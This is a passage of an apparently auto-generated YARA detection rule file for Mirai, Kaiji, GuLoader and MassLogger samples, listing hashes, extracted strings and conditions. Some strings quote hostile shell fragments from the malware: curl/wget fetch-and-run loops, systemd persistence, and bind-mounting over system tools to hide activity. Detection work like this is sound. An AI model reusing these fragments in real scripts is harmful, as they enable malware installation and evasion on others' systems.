      hash17 = "188310f01ef7006928c9ed564216febc84749050ff8de44d6f4f08db84a265b2"
      hash18 = "19e62b77d21ddb588294e3254c61aa1f3475475903b0165b3dad4ac0e2886ca5"
   strings:
      $s1 = "__pthread_mutex_trylock" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s3 = "__pthread_mutex_init" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s5 = "geteuid.c" fullword ascii /* score: '9.00'*/
      $s6 = "getegid.c" fullword ascii /* score: '9.00'*/
      $s7 = "fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s8 = "__GI___fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s9 = "__fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s10 = "__GI_geteuid" fullword ascii /* score: '9.00'*/
      $s11 = "fgetc_unlocked.c" fullword ascii /* score: '9.00'*/
      $s12 = "fgets_unlocked" fullword ascii /* score: '9.00'*/
      $s13 = "getuid.c" fullword ascii /* score: '9.00'*/
      $s14 = "tcgetattr.c" fullword ascii /* score: '9.00'*/
      $s15 = "__GI_getegid" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__c6c0da6a_Kaiji_signature__ded5e440_Kaiji_signature__eec9b44f_34 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash2 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash3 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = "tls: failed to sign handshake: tls: unsupported public key: %Ttoo many PSK Key Exchange modestoo many transfer encodings: %qunsa" ascii /* score: '69.50'*/
      $x2 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii /* score: '54.50'*/
      $x3 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii /* score: '53.50'*/
      $x4 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii /* score: '47.00'*/
      $x5 = "tls: certificate used with invalid signature algorithm -- not implementedtls: internal error: handshake returned an error but is" ascii /* score: '46.00'*/
      $x6 = "http: message cannot contain multiple Content-Length headers; got %qpadding bytes must all be zeros unless AllowIllegalWrites is" ascii /* score: '42.50'*/
      $x7 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii /* score: '38.50'*/
      $x8 = ":[_outboundatomicor8attempts:bad indirbus errorchan sendchkconfigcomplex64continuedcopystackctxt != 0d.nx != 0dns,filesempty url" ascii /* score: '31.00'*/
      $s9 = "bufio.Scanner: Read returned impossible countcannot send after transport endpoint shutdowncharacter string exceeds maximum lengt" ascii /* score: '27.00'*/
      $s10 = "rmed non-numeric status pseudo headernet/http: server replied with more than declared Content-Length; truncatedpermessage-deflat" ascii /* score: '18.00'*/
      $s11 = "falsefaultfilesgcinggetwdgscanhchanhostshttpsidivaimap2imap3imapsinit int16int32int64linuxlstatmheapmkdirmonthmountpanicparsepip" ascii /* score: '18.00'*/
      $s12 = "syscall.CloseOnExec" fullword ascii /* score: '15.00'*/
      $s13 = "asic constraints bx509: invalid basic constraints cx509: invalid extended key usages binary. Recompile using GOARM=5." fullword ascii /* score: '15.00'*/
      $s14 = "to read random data from the kernel" fullword ascii /* score: '14.00'*/
      $s15 = "stack=[_gatewayaddress bad MASKbash_cfgbrotli: cgocheckcontinuecpsr    deadlockdefault:defaultsdns-tcp4documenterror   execwaite" ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 16000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__084ba7f2_Mirai_signature__0984cc42_Mirai_signature__0bc0cf73_35 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_084ba7f2.elf, Mirai(signature)_0984cc42.elf, Mirai(signature)_0bc0cf73.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "084ba7f2c977968d100c72b731e97742140e8c323b6b892fb170b0cc31236051"
      hash2 = "0984cc4252b777ef542e347ab472d038c633d81e77bb7138fe653820c27ac754"
      hash3 = "0bc0cf73166e80c3cb819e4591e3b8ceea4e0ab5c8281ccb18d1932819c5a658"
   strings:
      $s1 = "Host: example.com" fullword ascii /* score: '23.00'*/
      $s2 = "GET /?%s%d HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s3 = "test@example.com" fullword ascii /* score: '18.00'*/
      $s4 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" fullword ascii /* score: '17.00'*/
      $s5 = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" fullword ascii /* score: '17.00'*/
      $s6 = "/proxy.txt" fullword ascii /* score: '14.00'*/
      $s7 = "/downloads/brochure.pdf" fullword ascii /* score: '13.00'*/
      $s8 = "GET / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s9 = "/assets/images/logo.png" fullword ascii /* score: '12.00'*/
      $s10 = "/login" fullword ascii /* score: '12.00'*/
      $s11 = "/wp-content/uploads/2023/" fullword ascii /* score: '11.00'*/
      $s12 = "Warning: Failed to load proxies, continuing with direct connections" fullword ascii /* score: '10.00'*/
      $s13 = "Product description text" fullword ascii /* score: '10.00'*/
      $s14 = "200 Connection established" fullword ascii /* score: '9.00'*/
      $s15 = "\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\"" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__084ba7f2_Mirai_signature__0984cc42_Mirai_signature__0b7b7321_Mirai_signature__0bc0cf73_Mirai_signature__13_36 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_084ba7f2.elf, Mirai(signature)_0984cc42.elf, Mirai(signature)_0b7b7321.elf, Mirai(signature)_0bc0cf73.elf, Mirai(signature)_1368463f.elf, Mirai(signature)_1781c186.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "084ba7f2c977968d100c72b731e97742140e8c323b6b892fb170b0cc31236051"
      hash2 = "0984cc4252b777ef542e347ab472d038c633d81e77bb7138fe653820c27ac754"
      hash3 = "0b7b732129985b5071190ca43f24c3a9609aded4cc76f9c4950374e650184174"
      hash4 = "0bc0cf73166e80c3cb819e4591e3b8ceea4e0ab5c8281ccb18d1932819c5a658"
      hash5 = "1368463ff5e905ed9ce63ed978d1ff6a03ff1ac373ac1ddca21dec9f8b3330ac"
      hash6 = "1781c1863810ca199f767491dcb715de7cb52c370bbce958641144b03e767d95"
   strings:
      $s1 = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s4 = "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s5 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__Kaiji_signature__78e6c917_Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Kaiji_signature__af3c1821_Ka_37 {
   meta:
      description = "_subset_batch - from files Kaiji(signature).elf, Kaiji(signature)_78e6c917.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash2 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash3 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash4 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash5 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash6 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash7 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash8 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash9 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = "startm: P required for spinning=truestrings.Builder.Grow: negative countsyntax error scanning complex numbertls: server did not " ascii /* score: '62.50'*/
      $x2 = "34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorTime.UnmarshalBinary: unsupported versionasn1:" ascii /* score: '46.50'*/
      $x3 = "non-IPv4 addressnon-IPv6 addressobject is remoteopt.services.cfgproxy-connectionquotaoff.serviceread_frame_otherreading header: " ascii /* score: '37.00'*/
      $x4 = "GC mark terminationGC work not flushedIDS_Binary_OperatorINADEQUATE_SECURITYINITIAL_WINDOW_SIZEKhitan_Small_ScriptMisdirected Re" ascii /* score: '31.00'*/
      $s5 = "512: invalid hash state sizeexec: StderrPipe after process startedexec: StdoutPipe after process startedexpected an Ed25519 publ" ascii /* score: '26.00'*/
      $s6 = "os/exec.Command(assertion failurebad TinySizeClasscorrupt zip file decryption failedentersyscallblockexec format errorexec: kill" ascii /* score: '25.00'*/
      $s7 = "content-locationcontext canceleddivision by zeroexec: no commandgc: unswept spangcshrinkstackoffhostLookupOrder=integer overflow" ascii /* score: '24.00'*/
      $s8 = "ing Cmdexec: not startedfractional secondframe_ping_lengthfutexwakeup addr=g already scannedgp.waiting != nilgzip, deflate, brha" ascii /* score: '23.00'*/
      $s9 = "186264514923095703125931322574615478515625Anatolian_HieroglyphsAres: unknown mistakeEXUBERANT_META_NIBBLEInscriptional_PahlaviIn" ascii /* score: '22.00'*/
      $s10 = "math.log" fullword ascii /* score: '19.00'*/
      $s11 = "t encodinginvalid P521 compressed point encodingmakechan: invalid channel element typenet/http: invalid header field name %qrunt" ascii /* score: '18.00'*/
      $s12 = "ected %d, got %dmheap.freeSpanLocked - invalid span statemheap.freeSpanLocked - invalid stack freenet/url: invalid control chara" ascii /* score: '17.50'*/
      $s13 = " internal error in parseTagAndLengthat most 2 grease extensions are supportedattempted to add zero-sized address rangebinary: va" ascii /* score: '17.00'*/
      $s14 = "essagetls: missing ServerKeyExchange messagetls: server selected unsupported curvetls: server selected unsupported groupunreacha" ascii /* score: '17.00'*/
      $s15 = "tion in call to Datetls: internal error: unsupported curvetls: invalid ClientKeyExchange messagetls: invalid ServerKeyExchange m" ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _GuLoader_signature__33055d37_GuLoader_signature__a1a199f2_MassLogger_signature__MassLogger_signature__026dd0a0_MassLogger_s_38 {
   meta:
      description = "_subset_batch - from files GuLoader(signature)_33055d37.vbs, GuLoader(signature)_a1a199f2.vbs, MassLogger(signature).vbs, MassLogger(signature)_026dd0a0.vbs, MassLogger(signature)_9edbb405.vbs, MassLogger(signature)_a33a1cc4.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "33055d37a3e16d841ea4f132e709167bed6ce8c9f1940be4cb522537e635454c"
      hash2 = "a1a199f270e7be974357239cd81eb58852d49832fd946f9f61b05fbfed896202"
      hash3 = "6963136965cd4a8cab567d7dc4435484e5a390946d3bb811878ce91f78ddc15c"
      hash4 = "026dd0a01c3d8969512184706f8c858b40bb19a09089d0172a0131dfa388f1b3"
      hash5 = "9edbb405c50942558c0c2fd992038d6e60fbddacf3c996b311a0c3cca836d9b7"
      hash6 = "a33a1cc44de644f4606244fe1896aae06f65e2e86a569496066918ab190ad465"
   strings:
      $s1 = "WScript.Echo \"Original Random Numbers:\"" fullword ascii /* score: '19.00'*/
      $s2 = "WScript.Echo vbCrLf & \"Statistics:\"" fullword ascii /* score: '15.00'*/
      $s3 = "WScript.Echo vbCrLf & \"Sorted Numbers:\"" fullword ascii /* score: '15.00'*/
      $s4 = "WScript.Echo \"Maximum: \" & maxVal" fullword ascii /* score: '13.00'*/
      $s5 = "WScript.Echo \"Minimum: \" & minVal" fullword ascii /* score: '13.00'*/
      $s6 = "WScript.Echo \"Average: \" & Round(avg, 2)" fullword ascii /* score: '13.00'*/
      $s7 = "str = wshNetwork.ComputerName" fullword ascii /* score: '11.00'*/
      $s8 = "'Spdgddfsus associatively ideopraxist eyebolt nonapostolical;" fullword ascii /* score: '10.00'*/
      $s9 = "Set wshNetwork = WScript.CreateObject(\"WScript\" & \".Network\")" fullword ascii /* score: '10.00'*/
      $s10 = "'Loansdfsdfdarking scrgouged teugh, jernmaske." fullword ascii /* score: '9.00'*/
      $s11 = "Const Micradfffgffoffafspace = \"Pakddgffafakefdweed kakados,\"" fullword ascii /* score: '9.00'*/
      $s12 = "eaddfdfdda" ascii /* score: '8.00'*/
      $s13 = "WScript.Quit   " fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x0a0a and filesize < 50KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__100e0eb8_Mirai_signature__1349ebd3_Mirai_signature__142ac936_Mirai_signature__16b7eb2d_Mirai_signature__19_39 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_100e0eb8.elf, Mirai(signature)_1349ebd3.elf, Mirai(signature)_142ac936.elf, Mirai(signature)_16b7eb2d.elf, Mirai(signature)_19adf628.elf, Mirai(signature)_1b42c968.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "100e0eb8f8e79c69ad97e36e542700bb8e1b83986de9b0a65e8e80c92a8cee7f"
      hash2 = "1349ebd3abb6414201588c32d768af7aba59dedf21fc817b872364406f8567e9"
      hash3 = "142ac936b9784e7b4ab66894312833684f55de981ef08e367130e20dc2257b43"
      hash4 = "16b7eb2d1f077ce1198a67b98bcb7caccd9511dd10bc39ea285aa2fba89be5d2"
      hash5 = "19adf6285b1504c96400173287c0b0bdb8d0e071c3dff9706a67ea36a6e543a4"
      hash6 = "1b42c96817bc2176345953b1049ed126e3f82e01e52afba63562c72132bab2e4"
   strings:
      $s1 = "        rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s2 = "          rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s3 = "      rm -f \"$TEMP_SCRIPT\" 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s4 = "After=network.target multi-user.target" fullword ascii /* score: '17.00'*/
      $s5 = "WantedBy=multi-user.target default.target" fullword ascii /* score: '17.00'*/
      $s6 = "      for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 " ascii /* score: '15.00'*/
      $s7 = "    for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 -O" ascii /* score: '15.00'*/
      $s8 = "    for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 -O" ascii /* score: '15.00'*/
      $s9 = "      for tool in 'curl -fsSL --max-time 30' 'wget -q --timeout=30 -O-' 'busybox wget -q -T 30 -O-' '/bin/busybox wget -q -T 30 " ascii /* score: '15.00'*/
      $s10 = "ps | grep uraskid | grep -v grep > /dev/null 2>&1 || %s skidstart &" fullword ascii /* score: '15.00'*/
      $s11 = "systemctl enable %s.service 2>/dev/null" fullword ascii /* score: '13.00'*/
      $s12 = "#!/bin/sh /etc/rc.common" fullword ascii /* score: '12.00'*/
      $s13 = "        chmod +x \"$TEMP_SCRIPT\" && sh \"$TEMP_SCRIPT\" >/dev/null 2>&1 &" fullword ascii /* score: '12.00'*/
      $s14 = "        TEMP_SCRIPT=\"/tmp/.s$$\"" fullword ascii /* score: '12.00'*/
      $s15 = "          chmod +x \"$TEMP_SCRIPT\" && sh \"$TEMP_SCRIPT\" >/dev/null 2>&1 &" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__Kaiji_signature__c6c0da6a_Kaiji_signature__ded5e440_Kaiji_signature__eec9b44f_40 {
   meta:
      description = "_subset_batch - from files Kaiji(signature).elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash2 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash3 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash4 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii /* score: '57.00'*/
      $x2 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii /* score: '46.00'*/
      $s3 = " log: tls: invalid server finished hashtls: unexpected ServerKeyExchangetoo many Answers to pack (>65535)too many levels of symb" ascii /* score: '25.00'*/
      $s4 = "ngstruct contains unexported fieldssync: RUnlock of unlocked RWMutextimer period must be non-negativetls: failed to write to key" ascii /* score: '21.00'*/
      $s5 = "ime.main not on m0runtime: out of memoryruntime: work.nwait = runtime:scanstack: gp=s.freeindex > s.nelemsscanstack - bad status" ascii /* score: '19.00'*/
      $s6 = "owheader field %q = %q%shpack: string too longhttp2: frame too largeidna: invalid label %qinappropriate fallbackinteger divide b" ascii /* score: '19.00'*/
      $s7 = "ntime: gs.state = schedtracesemacquireset-cookiesetenforcesetsockoptshort readskipping: stackLarget.Kind == terminatedtime.Date(" ascii /* score: '19.00'*/
      $s8 = "an data payloadpseudo header field after regularreflect.nameFrom: name too long: reflect: Field index out of rangereflect: NumOu" ascii /* score: '18.00'*/
      $s9 = ": input not full blockcrypto/ecdh: invalid private keyed25519: bad public key length: frame_windowupdate_zero_inc_conngo package" ascii /* score: '18.00'*/
      $s10 = "TUUUUUUUUUUUUU" fullword ascii /* reversed goodware string 'UUUUUUUUUUUUUT' */ /* score: '16.50'*/
      $s11 = "ds out of range [::%x]software caused connection abortsweep increased allocation countsync: Unlock of unlocked RWMutexsync: nega" ascii /* score: '16.00'*/
      $s12 = "TP versionminpc or maxpc invalidmissing ']' in addressnetwork is unreachablenon-Go function at pc=oldoverflow is not niloperatio" ascii /* score: '15.00'*/
      $s13 = "umIn of non-func type removespecial on invalid pointerresource temporarily unavailableruntime: fixalloc size too largeruntime: m" ascii /* score: '14.00'*/
      $s14 = "d issuerzero length BIT STRING (invalid payload data)) must be a power of 2" fullword ascii /* score: '13.00'*/
      $s15 = "M*struct { F uintptr; .autotmp_9 *http.Transport; .autotmp_10 *http.wantConn }" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 16000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__007e5dc7_Mirai_signature__07fa795b_Mirai_signature__08816e63_Mirai_signature__0b625b19_Mirai_signature__0c_41 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_007e5dc7.elf, Mirai(signature)_07fa795b.elf, Mirai(signature)_08816e63.elf, Mirai(signature)_0b625b19.elf, Mirai(signature)_0cb12f03.elf, Mirai(signature)_0e5b6487.elf, Mirai(signature)_198c0ce2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "007e5dc71d719cca62c058bb806143c2d7627f80d204c25494229d012d535cb4"
      hash2 = "07fa795b94793c19b4b6e839e007894daa5809e1385353339ce92568c4183251"
      hash3 = "08816e635573569b4cb82c5002aaed63295a98a94f7dff72485be20db1762c44"
      hash4 = "0b625b19f44fcf0d5d279b91e1a31797e05822bcecebf5eb89f34fd54e7b943a"
      hash5 = "0cb12f03cf5aefd3d2dcfa90b1a9422f120424f2b1478b1d86ac04b90854f2f3"
      hash6 = "0e5b648736c6444322ab5e60c726a96f95a15c148f4243329b5a397eef0da948"
      hash7 = "198c0ce29b9d71a04dbf44baa87e916cf5ba47924f03961659472b84d9cd946a"
   strings:
      $s1 = "tcpdump" fullword ascii /* score: '18.00'*/
      $s2 = "hexdump" fullword ascii /* score: '18.00'*/
      $s3 = "/usr/lib/systemd/system/reboot.target" fullword ascii /* score: '17.00'*/
      $s4 = "/etc/systemd/system/reboot.target" fullword ascii /* score: '17.00'*/
      $s5 = "  4) echo 'Fatal error: User is a script kiddie';;" fullword ascii /* score: '16.00'*/
      $s6 = "for c in ps kill grep ls cat readlink mount umount awk sed cut wget curl top netstat ss lsof reboot shutdown halt poweroff; do m" ascii /* score: '15.00'*/
      $s7 = "for p in $(ps aux | grep '[%c]%s' | awk '{print $2}'); do   if [ $(stat -c %%X /proc/$p/stat 2>/dev/null || echo 0) -lt $(( $(da" ascii /* score: '14.00'*/
      $s8 = "  0) echo 'Command not found: Your skill level';;" fullword ascii /* score: '12.00'*/
      $s9 = "/tmp/$c /sbin/$c 2>/dev/null; mount --bind /tmp/$c /usr/sbin/$c 2>/dev/null; done" fullword ascii /* score: '11.00'*/
      $s10 = "systemctl" fullword ascii /* score: '11.00'*/
      $s11 = "kfifo /tmp/$c 2>/dev/null; mount --bind /tmp/$c /bin/$c 2>/dev/null; mount --bind /tmp/$c /usr/bin/$c 2>/dev/null; mount --bind " ascii /* score: '11.00'*/
      $s12 = "te +%%s) - 30 )) ]; then     kill -9 $p 2>/dev/null;   fi; done" fullword ascii /* score: '10.00'*/
      $s13 = "/usr/bin/service" fullword ascii /* score: '10.00'*/
      $s14 = "ftpget" fullword ascii /* score: '10.00'*/
      $s15 = "/sbin/service" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Kaiji_signature__af3c1821_Kaiji_signature__bd7a37a8_42 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash2 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash3 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash4 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
   strings:
      $x1 = ".localhost.localdomain/etc/init.d/boot.local/etc/ssl/ca-bundle.pem/lib/time/zoneinfo.zip/usr/sbin/ifconfig.cfg465661287307739257" ascii /* score: '57.00'*/
      $x2 = "tls: protocol is shutdownunexpected '[' in addressunexpected ']' in addressunexpected fault address unknown Go type for slicex50" ascii /* score: '54.50'*/
      $x3 = "IP addressKeep-AliveKharoshthiManichaeanMessage-IdNo ContentOld_ItalicOld_PermicOld_TurkicOther_MathPOSTALCODEPhoenicianProcessi" ascii /* score: '46.00'*/
      $s4 = "unixpacketunknown pcuser-agent  of size   (targetpc= , plugin:  ErrCode=%v KiB work,  exp.) for  freeindex= gcwaiting= idleprocs" ascii /* score: '30.00'*/
      $s5 = "bad g transitionbad special kindbad summary databad symbol tablebinary.BigEndiancastogscanstatuscontent-encodingcontent-language" ascii /* score: '24.00'*/
      $s6 = "ime: out of memoryruntime: work.nwait = runtime:scanstack: gp=s.freeindex > s.nelemsscanstack - bad statussend on closed channel" ascii /* score: '19.00'*/
      $s7 = "byte: length overflowcurrent time %s is after %sfailed to set sweep barrierfile locking deadlock errorframe_pushpromise_pad_shor" ascii /* score: '18.00'*/
      $s8 = "ue.UnsafePointerrunlock of unlocked rwmutexruntime: asyncPreemptStack=runtime: checkdead: find g runtime: checkdead: nmidle=runt" ascii /* score: '18.00'*/
      $s9 = " responsenot a XENIX named type fileos: process not initializedos: unsupported signal typeprogToPointerMask: overflowreflect.Val" ascii /* score: '18.00'*/
      $s10 = "stack=[_gatewayaddress bad MASKbash_cfgbrotli: cgocheckcontinuedeadlockdefault:defaultsdns-tcp4documentexecwaitexplicitexporterf" ascii /* score: '17.00'*/
      $s11 = "eflect.runnableruntime.rwmutexRrwmutexWscavengesendfilesignal: strconv.terminaltime.UTCtimeout:traceBuftrigger=trust-adtryagainu" ascii /* score: '17.00'*/
      $s12 = "stack=[_gatewayaddress bad MASKbash_cfgbrotli: cgocheckcontinuedeadlockdefault:defaultsdns-tcp4documentexecwaitexplicitexporterf" ascii /* score: '15.00'*/
      $s13 = "arget.Kind == terminatedtime.Date(time.Localtracefree(tracegc()" fullword ascii /* score: '15.00'*/
      $s14 = "falsefaultfilesgcinggetwdgscanhchanhi   hostshttpsimap2imap3imapsinit int16int32int64link linuxlo   lstatmheapmkdirmonthmountpan" ascii /* score: '13.00'*/
      $s15 = "T STRING (invalid payload data)) must be a power of 2" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__8895157c_Kaiji_signature__af3c1821_43 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_8895157c.elf, Kaiji(signature)_af3c1821.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash2 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
   strings:
